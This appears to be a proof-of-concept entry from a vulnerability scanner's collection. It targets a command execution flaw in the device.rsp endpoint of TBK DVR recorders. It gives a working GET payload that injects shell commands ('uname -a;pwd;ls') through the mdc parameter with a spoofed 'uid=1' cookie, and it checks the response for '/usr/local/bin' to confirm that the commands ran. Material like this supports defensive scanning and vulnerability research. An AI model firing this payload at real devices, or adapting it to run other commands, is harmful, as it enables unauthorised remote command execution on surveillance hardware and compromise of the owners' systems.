{
        'name': 'TBK DVR硬盘录像机 device.rsp 命令执行漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;pwd;ls',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
                'Cookie': 'uid=1'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': "/usr/local/bin"
        }}]
    }